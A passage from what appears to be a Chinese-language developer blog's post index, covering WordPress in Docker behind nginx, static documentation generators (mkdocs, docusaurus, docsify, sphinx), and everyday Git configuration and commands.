<span class="string">db:3306</span></span><br><span class="line">       <span class="attr">WORDPRESS_DB_USER:</span> <span class="string">wordpress</span></span><br><span class="line">       <span class="attr">WORDPRESS_DB_PASSWORD:</span> <span class="string">wordpress</span></span><br><span class="line">       <span class="attr">WORDPRESS_DB_NAME:</span> <span class="string">wordpress</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">    <span class="attr">db_data:</span> <span class="string">&#123;&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker-compose up</span><br></pre></td></tr></table></figure>
<p>等待Docker下载安装直至完成，并且启动。</p>
<h2 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	listen [::]:80;</span><br><span class="line"></span><br><span class="line">	server_name www.domain.com;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">	proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;	</span><br><span class="line"></span><br><span class="line">	location / &#123;</span><br><span class="line">		proxy_pass http://127.0.0.1:8000;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于WordPress只能在80端口启动，所以通过Docker网络将宿主机的8000端口映射到docker容器网络80端口，Nginx再通过反向代理将80端口代理到8000。<br>然后再设置DNS，将域名指向服务器的IP地址就可以了。</p>
<h2 id="爬坑"><a href="#爬坑" class="headerlink" title="爬坑"></a>爬坑</h2><p>确认可以了？访问域名，自动跳转到WordPress “famous five-minute installation” 著名的5分钟安装界面，但是发现css等东西没生效。</p>
<p>安装完成之后，登录就有问题了，直接跳转到 <code>http://127.0.0.1:8000</code> ,而且目前这种情况还没法设置站点地址。</p>
<p>这个坑本来想在 <code>docker-compose.yml</code> 找到解决办法，但是没找到设置站点地址的参数，改数据库太麻烦。</p>
<p>刚好本地PC机也装有nginx，于是用nginx的反向代理临时解决登录问题，进去控制台再设置站点地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 8000;</span><br><span class="line">	server_name localhost;</span><br><span class="line"></span><br><span class="line">	location / &#123;</span><br><span class="line">		proxy_pass http://www.domain.com;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样在本地访问 <code>localhost:8000</code> 就能访问到Docker的WordPress，并且可以登录了。<br>登录之后，将站点的URL地址为你的域名，然后就OK了，本地的nginx也可以删掉了。</p>
<h2 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h2><p>写的题外的内容：WordPress的使用。<br>安装完成WordPress，默认它是一个博客，但一般我们用WordPress不是做一个博客，而是做企业官网、内容展示、电子商务等。<br>要实现这些的话，就要安装主题了，安装了主题之后，你就能基于主题来修改它的具体内容，比如一些标题，图片等，跟装饰淘宝店一样，或者说和基于PPT母板来做PPT一样。</p>
<p>那么如果找一个合适的主题？</p>
<p>可以在WordPress内浏览，或者在Google搜索，主题的安装可以在线安装，也可以上次压缩包安装。在Google搜索到的合适主题，如果想在线安装，可以在WordPress内搜索一遍，也许会找到，直接在线安装就好。<br>比如，在Google搜索到 <code>Sparker</code> 主题，上传压缩包提示安装失败，在WordPress搜索一下，结果上面就有，直接点安装。</p>
<p>那么，如果你客户对网站的个性化比较强，没有主题模板符合需要怎么办？</p>
<p>业内有一些 <code>主题编辑器</code> ，可以不写代码，编辑一份自定义的主题，导出来就能安装到WordPress,比如 <a href="https://elementor.com/" target="_blank" rel="noopener">elementor</a> 就是其中一个。<br><a href="https://bestscreenshot.com/how-to-build-company-site-using-wordpress-part2/" target="_blank" rel="noopener">elementor使用教程</a><br><a href="https://themeforwp.net/archives/elementor-theme-builder/" target="_blank" rel="noopener">elementor使用教程</a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>网站文档mkdocs</title>
    <url>/docs%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7/%E7%BD%91%E7%AB%99%E6%96%87%E6%A1%A3mkdocs/</url>
    <content><![CDATA[<p><a href="https://www.mkdocs.org/#mkdocs" target="_blank" rel="noopener">mkdocs.org</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 安装python2<span class="number">.7</span>（安装时选中加入环境变量）</span><br><span class="line"><span class="number">2.</span> pip install mkdocs &amp; mkdocs --version</span><br><span class="line"><span class="number">3.</span> pip install click-man</span><br><span class="line"><span class="number">4.</span> mkdocs new my-project &amp; cd my-project</span><br><span class="line"><span class="number">5.</span> mkdocs serve</span><br><span class="line"><span class="number">6.</span> mkdocs build</span><br><span class="line"><span class="number">7.</span> mkdocs build --clean (清理已被删除的文档所生成的html文件)</span><br></pre></td></tr></table></figure>
<h2 id="mkdocs-material主题配置"><a href="#mkdocs-material主题配置" class="headerlink" title="mkdocs-material主题配置"></a>mkdocs-material主题配置</h2><p><a href="https://squidfunk.github.io/mkdocs-material/getting-started/" target="_blank" rel="noopener">点击看效果 mkdocs-material</a>  </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. pip install mkdocs-material</span><br><span class="line">2. vim mkdocs.yml</span><br></pre></td></tr></table></figure>
<p>mkdocs.yml 配置示例：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">site_name:</span> <span class="string">文档中心</span></span><br><span class="line"><span class="attr">theme:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">'material'</span></span><br><span class="line">  <span class="attr">palette:</span></span><br><span class="line">    <span class="attr">primary:</span> <span class="string">'teal'</span></span><br><span class="line">    <span class="attr">accent:</span> <span class="string">'teal'</span></span><br><span class="line">  <span class="attr">font:</span></span><br><span class="line">    <span class="attr">text:</span> <span class="string">'Roboto'</span></span><br><span class="line">    <span class="attr">code:</span> <span class="string">'Roboto Mono'</span></span><br></pre></td></tr></table></figure>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul>
<li><code>mkdocs new [dir-name]</code> - Create a new project.</li>
<li><code>mkdocs serve</code> - Start the live-reloading docs server.</li>
<li><code>mkdocs build</code> - Build the documentation site.</li>
<li><code>mkdocs help</code> - Print this help message.</li>
</ul>
<h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">mkdocs.yml</span>    <span class="comment"># The configuration file.</span></span><br><span class="line"><span class="string">docs/</span></span><br><span class="line">    <span class="string">index.md</span>  <span class="comment"># The documentation homepage.</span></span><br><span class="line">    <span class="string">...</span>       <span class="comment"># Other markdown pages, images and other files.</span></span><br></pre></td></tr></table></figure>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/images/docs/mkdocs预览.png" alt="mkdocs预览.png"></p>
]]></content>
      <categories>
        <category>docs文档工具</category>
      </categories>
      <tags>
        <tag>docs</tag>
      </tags>
  </entry>
  <entry>
    <title>网站文档docusaurus使用</title>
    <url>/docs%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7/%E7%BD%91%E7%AB%99%E6%96%87%E6%A1%A3docusaurus%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h2><p><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener">docusaurus</a> 是 Faecbook 专门为开源项目开发者提供的一款易于维护的静态网站创建工具，使用 Markdown即可更新网站。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://docusaurus.io/docs/en/installation.html" target="_blank" rel="noopener">按照文档安装docusaurus</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cnpm install --global docusaurus-init</span><br><span class="line">$ docusaurus-init</span><br><span class="line">Website folder created!</span><br><span class="line"></span><br><span class="line">Installing latest version of Docusaurus in website.</span><br><span class="line"></span><br><span class="line">npm WARN deprecated browserslist@1.7.7: Browserslist 2 could fail on reading Browserslist &gt;3.0 config used in other tools.</span><br><span class="line">npm WARN deprecated coffee-script@1.12.7: CoffeeScript on NPM has moved to &quot;coffeescript&quot; (no hyphen)</span><br><span class="line"></span><br><span class="line">&gt; gifsicle@4.0.1 postinstall D:\SourceCode\npm\demo\website\node_modules\gifsicle</span><br><span class="line">&gt; node lib/install.js</span><br><span class="line"></span><br><span class="line">  √ gifsicle pre-build test passed successfully</span><br><span class="line"></span><br><span class="line">&gt; jpegtran-bin@4.0.0 postinstall D:\SourceCode\npm\demo\website\node_modules\jpegtran-bin</span><br><span class="line">&gt; node lib/install.js</span><br><span class="line"></span><br><span class="line">  √ jpegtran pre-build test passed successfully</span><br><span class="line"></span><br><span class="line">&gt; optipng-bin@5.1.0 postinstall D:\SourceCode\npm\demo\website\node_modules\optipng-bin</span><br><span class="line">&gt; node lib/install.js</span><br><span class="line"></span><br><span class="line">  √ optipng pre-build test passed successfully</span><br><span class="line">npm notice created a lockfile as package-lock.json. You should commit this file.</span><br><span class="line">npm WARN website No description</span><br><span class="line">npm WARN website No repository field.</span><br><span class="line">npm WARN website No license field.</span><br><span class="line"></span><br><span class="line">+ docusaurus@1.9.0</span><br><span class="line">added 1064 packages in 65.262s</span><br><span class="line">Docusaurus installed in website folder!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; @ examples D:\SourceCode\npm\demo\website</span><br><span class="line">&gt; docusaurus-examples</span><br><span class="line"></span><br><span class="line">Wrote docusaurus scripts to package.json file.</span><br><span class="line"></span><br><span class="line">demo</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── docs</span><br><span class="line">│   ├── doc1.md</span><br><span class="line">│   ├── doc2.md</span><br><span class="line">│   ├── doc3.md</span><br><span class="line">│   ├── exampledoc4.md</span><br><span class="line">│   └── exampledoc5.md</span><br><span class="line">└── website</span><br><span class="line">    ├── blog</span><br><span class="line">    │   ├── 2016-03-11-blog-post.md</span><br><span class="line">    │   ├── 2017-04-10-blog-post-two.md</span><br><span class="line">    │   ├── 2017-09-25-testing-rss.md</span><br><span class="line">    │   ├── 2017-09-26-adding-rss.md</span><br><span class="line">    │   └── 2017-10-24-new-version-1.0.0.md</span><br><span class="line">    ├── core</span><br><span class="line">    │   └── Footer.js</span><br><span class="line">    ├── package-lock.json</span><br><span class="line">    ├── package.json</span><br><span class="line">    ├── pages</span><br><span class="line">    │   └── en</span><br><span class="line">    │       ├── help.js</span><br><span class="line">    │       ├── index.js</span><br><span class="line">    │       └── users.js</span><br><span class="line">    ├── README.md</span><br><span class="line">    ├── sidebars.json</span><br><span class="line">    ├── siteConfig.js</span><br><span class="line">    └── static</span><br><span class="line">        ├── css</span><br><span class="line">        │   └── custom.css</span><br><span class="line">        └── img</span><br><span class="line">            ├── favicon.ico</span><br><span class="line">            ├── oss_logo.png</span><br><span class="line">            ├── undraw_code_review.svg</span><br><span class="line">            ├── undraw_monitor.svg</span><br><span class="line">            ├── undraw_note_list.svg</span><br><span class="line">            ├── undraw_online.svg</span><br><span class="line">            ├── undraw_open_source.svg</span><br><span class="line">            ├── undraw_operating_system.svg</span><br><span class="line">            ├── undraw_react.svg</span><br><span class="line">            ├── undraw_tweetstorm.svg</span><br><span class="line">            └── undraw_youtube_tutorial.svg</span><br></pre></td></tr></table></figure>
<h2 id="运行demo"><a href="#运行demo" class="headerlink" title="运行demo"></a>运行demo</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd website/</span><br><span class="line">$ npm start</span><br></pre></td></tr></table></figure>
<p><img src="/images/docs/docusaurus-demo1.png" alt="docusaurus-demo1.png"></p>
<p><img src="/images/docs/docusaurus-demo2.png" alt="docusaurus-demo2.png"></p>
<p><img src="/images/docs/docusaurus-demo3.png" alt="docusaurus-demo3.png"></p>
<h2 id="构建-amp-生成静态Html文件"><a href="#构建-amp-生成静态Html文件" class="headerlink" title="构建&amp;生成静态Html文件"></a>构建&amp;生成静态Html文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm run build</span><br></pre></td></tr></table></figure>
<p>这将在 website 目录下生成一个 build 文件夹, 其中包含 website 目录下所有文档和其他页面中所含的 .html 文件。</p>
<h2 id="目录介绍"><a href="#目录介绍" class="headerlink" title="目录介绍"></a>目录介绍</h2><ul>
<li>文档源文件: 包含示例网站 <code>docs</code> 目录，用 <code>Markdown</code> 编写.</li>
<li>博客Blog: 包含示例网站 <code>website/blog</code> 目录，用 <code>Markdown</code> 编写.</li>
<li>页面：包含示例网站顶级页面的文件夹 <code>website/pages</code>。</li>
<li>静态资源与图片：包含供网站使用的静态资源文件夹 <code>website/static</code></li>
<li>页脚： <code>website/core/Footer.js</code> 文件是一个 <code>React</code> 组件，用于生成 <code>Docusaurus</code> 站点的页脚，它可以由用户定制。</li>
<li>配置文件： <code>website/siteConfig.js</code> 文件是 <code>Docusaurus</code> 的主配置文件。</li>
<li>工具栏： <code>sidebars.json</code> 文件包含文档文件的结构与排序。</li>
</ul>
<h2 id="官网效果"><a href="#官网效果" class="headerlink" title="官网效果"></a>官网效果</h2><p><img src="/images/docs/docusaurus使用1.png" alt="docusaurus使用1.png"></p>
<p><img src="/images/docs/docusaurus使用2.png" alt="docusaurus使用2.png"></p>
<p><img src="/images/docs/docusaurus使用3.png" alt="docusaurus使用3.png"></p>
<h2 id="使用docusaurus的用户"><a href="#使用docusaurus的用户" class="headerlink" title="使用docusaurus的用户"></a>使用docusaurus的用户</h2><p><a href="https://docusaurus.io/en/users" target="_blank" rel="noopener">所有用户</a></p>
<p>大部分无法访问，挑了几个</p>
<ul>
<li><a href="https://developers.home-assistant.io/" target="_blank" rel="noopener">home-assistant</a></li>
<li><a href="https://qiu8310.github.io/minapp/" target="_blank" rel="noopener">minapp</a></li>
<li><a href="https://golang.github.io/dep/" target="_blank" rel="noopener">dep</a></li>
<li><a href="https://scalameta.org/scalafmt/" target="_blank" rel="noopener">scalafmt</a></li>
<li><a href="https://developers.polymath.network/" target="_blank" rel="noopener">polymath</a></li>
<li><a href="https://goby-lang.org/" target="_blank" rel="noopener">goby</a></li>
</ul>
]]></content>
      <categories>
        <category>docs文档工具</category>
      </categories>
      <tags>
        <tag>docs</tag>
      </tags>
  </entry>
  <entry>
    <title>网站文档docsify</title>
    <url>/docs%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7/%E7%BD%91%E7%AB%99%E6%96%87%E6%A1%A3docsify/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Binaryify/NeteaseCloudMusicApi/master/static/docs.png" alt></p>
<p><a href="https://github.com/Binaryify/NeteaseCloudMusicApi" target="_blank" rel="noopener">项目地址</a></p>
<p><a href="https://binaryify.github.io" target="_blank" rel="noopener">文档传送门 </a>，根据网站底部的说明：<br>此文档由 docsify 生成<br><a href="https://github.com/QingWei-Li/docsify/" target="_blank" rel="noopener">docsify</a> 是一个动态生成文档网站的工具。不同于 GitBook、Hexo 的地方是它不会生成将 .md 转成 .html 文件，所有转换工作都是在运行时进行。</p>
<p><a href="https://zhuanlan.zhihu.com/p/24540753" target="_blank" rel="noopener">使用教程</a></p>
<p>其实原理就是将 <a href="https://github.com/Binaryify/NeteaseCloudMusicApi/blob/master/docs" target="_blank" rel="noopener">https://github.com/Binaryify/NeteaseCloudMusicApi/blob/master/docs</a><br>目录的md文件生成github page ，在index.html引入docsify.js</p>
]]></content>
      <categories>
        <category>docs文档工具</category>
      </categories>
      <tags>
        <tag>docs</tag>
      </tags>
  </entry>
  <entry>
    <title>网站文档sphinx-doc</title>
    <url>/docs%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7/%E7%BD%91%E7%AB%99%E6%96%87%E6%A1%A3sphinx-doc/</url>
    <content><![CDATA[<h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p><a href="https://github.com/readthedocs/sphinx_rtd_theme" target="_blank" rel="noopener">【sphinx_rtd_theme】</a>主题<br><img src="/images/docs/sphinx-doc-web3.png" alt="web3.js文档"></p>
<p>自带的sphinx主题<br><img src="/images/docs/sphinx-doc官网.png" alt="web3.js文档"></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="http://www.sphinx-doc.org" target="_blank" rel="noopener">【sphinx-doc】</a>是基于python的文档生成器（使用文档推荐<a href="https://docs.readthedocs.io/en/stable/intro/getting-started-with-sphinx.html" target="_blank" rel="noopener">【这个】</a>），它使用 <code>reStructuredText</code> 语法(类似markdown)编写文档，通过编译，可以生成html,epub,man,pdf等多种格式，现在也可以通过安装扩展来支持简单的Markdown语法。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li><p>Ubuntu<br>python3-sphinx (Python 3) 或者 python-sphinx (Python 2)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt-get install python3-sphinx</span><br></pre></td></tr></table></figure>
</li>
<li><p>macOS</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ brew install sphinx-doc</span><br></pre></td></tr></table></figure>
</li>
<li><p>Windows</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pip install -U sphinx</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建空项目</span></span><br><span class="line">$ sphinx-quickstart</span><br><span class="line"><span class="comment"># 需要做很多的配置，完成之后目录结构如下：</span></span><br><span class="line">.</span><br><span class="line">├── _build</span><br><span class="line">├── conf.py</span><br><span class="line">├── index.rst</span><br><span class="line">├── make.bat</span><br><span class="line">├── Makefile</span><br><span class="line">├── _static</span><br><span class="line">└── _templates</span><br><span class="line"></span><br><span class="line">3 directories, 4 files</span><br><span class="line"><span class="comment"># 编译为html</span></span><br><span class="line">$ make html</span><br></pre></td></tr></table></figure>
<h2 id="支持Markdown"><a href="#支持Markdown" class="headerlink" title="支持Markdown"></a>支持Markdown</h2><p><a href="https://docs.readthedocs.io/en/stable/intro/getting-started-with-sphinx.html#using-markdown-with-sphinx" target="_blank" rel="noopener">【教程】</a><br><a href="http://www.sphinx-doc.org/en/master/usage/markdown.html" target="_blank" rel="noopener">【官网教程】</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pip install recommonmark</span><br></pre></td></tr></table></figure>
<p>conf.py 加入<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">extensions = [<span class="string">'recommonmark'</span>]</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>警告：Markdown不支持Sphinx的很多特性，比如内联标记和指令</p>
</blockquote>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>介绍一个主题<a href="https://github.com/readthedocs/sphinx_rtd_theme" target="_blank" rel="noopener">【sphinx_rtd_theme】</a></p>
<p><img src="/images/docs/readthedocs.png" alt="readthedocs"></p>
<p>它是<a href="https://readthedocs.org" target="_blank" rel="noopener">【readthedocs.org】</a>做的一个主题，这个网站本身提供 <code>创建、托管和浏览文档</code> ，比如它提供的<a href="https://docs.readthedocs.io/en/stable/intro/getting-started-with-sphinx.html" target="_blank" rel="noopener">【sphinx文档】</a>比 <a href="http://www.sphinx-doc.org/en/master/contents.html" target="_blank" rel="noopener">【sphinx官网】</a> 的好看多了。</p>
<p><a href="https://sphinx-rtd-theme.readthedocs.io/en/stable/" target="_blank" rel="noopener">【sphinx-rtd-theme的文档】</a></p>
<p>安装主题<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pip install sphinx_rtd_theme</span><br></pre></td></tr></table></figure></p>
<p>conf.py 配置<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">html_theme = &quot;sphinx_rtd_theme&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/docs/sphinx-doc-init.png" alt="安装主题初始化docs项目"></p>
<p><a href="https://sphinx-rtd-theme.readthedocs.io/en/latest/configuring.html" target="_blank" rel="noopener">【更多主题配置】</a></p>
]]></content>
      <categories>
        <category>docs文档工具</category>
      </categories>
      <tags>
        <tag>文档,sphinx</tag>
      </tags>
  </entry>
  <entry>
    <title>Git配置</title>
    <url>/git/Git%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>在Ubuntu下配置Git<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"username"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"useremail@mail.com"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"useremail@mail.com"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ~/.ssh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat id_rsa.pub</span></span><br></pre></td></tr></table></figure></p>
<p><code>id_rsa.pub</code> 是公钥信息，贴在Github上，就能push代码了。</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>Git升级后无法clone</title>
    <url>/git/Git%E5%8D%87%E7%BA%A7%E5%90%8E%E6%97%A0%E6%B3%95clone/</url>
    <content><![CDATA[<p>【2021-12-03】手贱在Win10的电脑管家上升级了Git至版本【2.34.0】，无意中发现无法执行clone命令克隆Gitlab上的仓库，Gitee、Github上的可以。</p>
<p>Gitlab版本信息：</p>
<blockquote>
<p> GitLab 10.5.5<br> GitLab Shell 6.0.3<br> GitLab Workhorse v3.6.0<br> GitLab API v4<br> Ruby 2.3.6p384<br> Rails 4.2.10<br> postgresql 9.6.5 </p>
</blockquote>
<p>故障表现为：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@192.168.0.186:kevin/test.git</span><br><span class="line">Cloning into <span class="string">'INNC'</span>...</span><br><span class="line">git@192.168.0.186<span class="string">'s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">git@192.168.0.186'</span>s password:</span><br><span class="line">Permission denied, please try again.</span><br><span class="line">git@192.168.0.186<span class="string">'s password:</span></span><br><span class="line"><span class="string">git@192.168.0.186: Permission denied (publickey,password).</span></span><br><span class="line"><span class="string">fatal: Could not read from remote repository.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Please make sure you have the correct access rights</span></span><br><span class="line"><span class="string">and the repository exists.</span></span><br></pre></td></tr></table></figure></p>
<p>无论输入什么密码，都是错误的，SSH秘钥确定已经添加了，为了确定是秘钥的问题，我又重新生成了一对新的加上去，依然不行。<br>我又在一台Linux机器上尝试克隆Gitlab仓库操作，OK一点问题都没有。 Win10这个Git有问题？猜想应该是Win10的新版Git与旧版的Gitlab兼容问题。</p>
<p>但是不确定是哪个版本合适，我一下子跳回到<a href="https://github.com/git-for-windows/git/releases/download/v2.34.1.windows.1/Git-2.24.2-64-bit.exe" target="_blank" rel="noopener">【Git-2.24.0】</a> 问题就修复了。</p>
<p>总结：<br>问题的根源还是旧版本的Gitlab，升级Gitlab是件痛苦的事情。</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>Git常用命令备忘</title>
    <url>/git/Git%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/</url>
    <content><![CDATA[<h2 id="暂存"><a href="#暂存" class="headerlink" title="暂存"></a>暂存</h2><p>会有这么一个场景，现在你正在用你的 feature 分支上开发新功能。这时，生产环境上出现了一个 bug 需要紧急修复，但是你这部分代码还没开发完，不想提交，怎么办？<br>这个时候可以用 git stash命令先把工作区已经修改的文件暂存起来，然后切换到 hotfix 分支上进行 bug 的修复，修复完成后，切换回 feature 分支，从堆栈中恢复刚刚保存的内容。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git stash //把本地的改动暂存起来</span><br><span class="line">git stash save <span class="string">"message"</span> 执行存储时，添加备注，方便查找。</span><br><span class="line"></span><br><span class="line">git stash pop // 应用最近一次暂存的修改，并删除暂存的记录</span><br><span class="line">git stash apply  // 应用某个存储,但不会把存储从存储列表中删除，默认使用第一个存储,即stash@&#123;0&#125;，如果要使用其他个，git stash apply stash@&#123;<span class="variable">$num</span>&#125; 。</span><br><span class="line"></span><br><span class="line">git stash list // 查看stash有哪些存储</span><br><span class="line">git stash clear // 删除所有缓存的stash</span><br></pre></td></tr></table></figure>
<h2 id="快速提交"><a href="#快速提交" class="headerlink" title="快速提交"></a>快速提交</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 等同于 git add . &amp;&amp; git commit -m</span></span><br><span class="line">git commit -am</span><br></pre></td></tr></table></figure>
<h2 id="修改最后一次提交message"><a href="#修改最后一次提交message" class="headerlink" title="修改最后一次提交message"></a>修改最后一次提交message</h2><p>有些时候不小心 <code>git commit -m ‘提交信息’</code> 中的 “提交信息” 写错了，可以执行命令修改：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git commit --amend -m <span class="string">"新的修改提交信息"</span></span><br></pre></td></tr></table></figure>
<p>注意：只能修改最后一次commit 。</p>
<h2 id="取消跟踪文件"><a href="#取消跟踪文件" class="headerlink" title="取消跟踪文件"></a>取消跟踪文件</h2><p>比如，创建仓库的时候 <code>.gitignore</code> 没写好，把 <code>.idea/</code> 的文件也加到仓库中，现在不想继续跟踪 <code>.idea/</code> 里面的文件，那么，执行以下命令，删除跟踪文件，保留本地的文件。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git rm -r --cached .idea/</span><br></pre></td></tr></table></figure></p>
<h2 id="拉取远程分支"><a href="#拉取远程分支" class="headerlink" title="拉取远程分支"></a>拉取远程分支</h2><p>clone 命令默认是克隆master分支，那么要拉取其他分支，用以下方法<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:gege/demo.git</span><br><span class="line">git fetch origin dev</span><br><span class="line">git checkout dev</span><br></pre></td></tr></table></figure></p>
<h2 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git merge develop --no-ff -m <span class="string">'merge develop into master'</span></span><br></pre></td></tr></table></figure>
<p><code>–no-ff</code> 可以保存分支历史，能够更好的查看 <code>merge</code> 历史，以及 <code>branch</code> 状态。</p>
<h2 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h2><p>假如我修改了文件 readme.txt，并没有add 和 commit ，但是对这次的修改搞到不满意，想还原到修改之前的状态（将文件在工作区的修改全部撤销）。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git checkout -- readme.txt</span><br></pre></td></tr></table></figure>
<p>注意：如果已经add，并且再次做了修改，那么上面的命令可以恢复到add时的状态</p>
<h2 id="撤销commit"><a href="#撤销commit" class="headerlink" title="撤销commit"></a>撤销commit</h2><p>假如提交了一次commit，马上就发现有问题，或者我想重新commit一次，修改 <code>-m &#39;xx&#39;</code> 的内容，可以恢复到执行commit之前的状态。</p>
<ol>
<li>查询提交历史<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">log</span></span><br><span class="line">commit 9ff40a7f902eeb7dd75a277246f3cd2c5b73e8de (HEAD -&gt; reload)</span><br><span class="line">Date:   Sat Jul 20 12:01:53 2019 +0800</span><br><span class="line"></span><br><span class="line">    这是一次错误的提交</span><br><span class="line"></span><br><span class="line">commit af57771d43deb47aff5d0dd16337b77634200072 (origin/reload)</span><br><span class="line">Date:   Fri Jul 19 22:46:30 2019 +0800</span><br><span class="line"></span><br><span class="line">    Fix BUG</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>其中，<code>9ff40a7f902eeb7dd75a277246f3cd2c5b73e8de</code>是最新的一次提交，也就是错误commit。<br>而 <code>af57771d43deb47aff5d0dd16337b77634200072</code> 是上次的commit，我们就恢复到这个commit，记得加上 <code>--mixed</code> 参数。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git reset af57771d43deb47aff5d0dd16337b77634200072 --mixed</span><br></pre></td></tr></table></figure>
<p>执行完之后，文件内容都没变，只是状态改变了（<code>Untracked</code>），使用 <code>&quot;git add&quot; and/or &quot;git commit -a&quot;)</code> 重新提交即可。</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>Git,命令,备忘</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitlab-Ubuntu清华大学安装源</title>
    <url>/git/gitlab-ubuntu%E6%B8%85%E5%8D%8E%E5%A4%A7%E5%AD%A6%E5%AE%89%E8%A3%85%E6%BA%90/</url>
    <content><![CDATA[<p><a href="https://mirror.tuna.tsinghua.edu.cn/help/gitlab-ce/" target="_blank" rel="noopener">【Gitlab Community Edition 镜像使用帮助】</a></p>
<p><strong>注意: gitlab-ce 镜像仅支持 x86-64 架构</strong></p>
<h3 id="Debian-Ubuntu-用户"><a href="#Debian-Ubuntu-用户" class="headerlink" title="Debian/Ubuntu 用户"></a>Debian/Ubuntu 用户</h3><p>首先信任 GitLab 的 GPG 公钥:</p>
